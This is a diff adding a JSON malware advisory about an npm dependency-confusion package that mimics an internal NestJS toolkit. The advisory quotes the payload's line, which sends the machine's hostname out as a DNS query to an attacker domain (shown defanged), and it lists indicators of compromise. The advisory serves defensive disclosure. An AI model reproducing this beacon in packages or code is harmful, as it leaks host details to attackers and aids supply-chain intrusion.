@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12754",
+  "modified": "2026-10-09T08:31:37Z",
+  "published": "2026-10-09T08:30:58Z",
+  "summary": "Malicious code in @galicia-toolkit-nestjs/commons (npm)",
+  "details": "@galicia-toolkit-nestjs/commons@999.0.1 is a dependency-confusion / version-squat stub: it publishes a sentinel version (999.0.1) under a scoped name that mimics an internal NestJS toolkit, but ships only a 419-byte index.js. The module exports three no-op NestJS-shaped helpers (version, forRoot, createLogger) as camouflage, then schedules a 5-second timer that reads the victim's hostname via os.hostname() and resolves it as a DNS label under the attacker-controlled domain, i.e. require('dns').resolve(hostname + '.c999[.]dc[.]oob[.]s4yhii[.]com'). This is an out-of-band collection channel: the machine's hostname is exfiltrated in the DNS query itself, with the 'c999' label acting as a campaign/target correlation id, allowing the operator to enumerate which hosts installed the package. The package contains no legitimate functionality, no dependencies, and no lifecycle hooks; the beacon runs whenever the module is required. No credential, token, or file theft was observed — the payload is limited to hostname exfiltration over DNS.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@galicia-toolkit-nestjs/commons",
+        "purl": "pkg:npm/%40galicia-toolkit-nestjs/commons"
+      },
+      "versions": [
+        "999.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-829",
+            "name": "Inclusion of Functionality from Untrusted Control Sphere"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@galicia-toolkit-nestjs/commons/v/999.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12754"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "dependency_confusion",
+      "first_seen_at": "2026-10-09T08:30:58Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "c999[.]dc[.]oob[.]s4yhii[.]com",
+          "s4yhii[.]com"
+        ],
+        "sha256": [
+          "0b3d9d324d9ee99da9966840718897acbdee6ed33828477b60b65ce246689874"
+        ]
+      }
+    }
+  }
+}
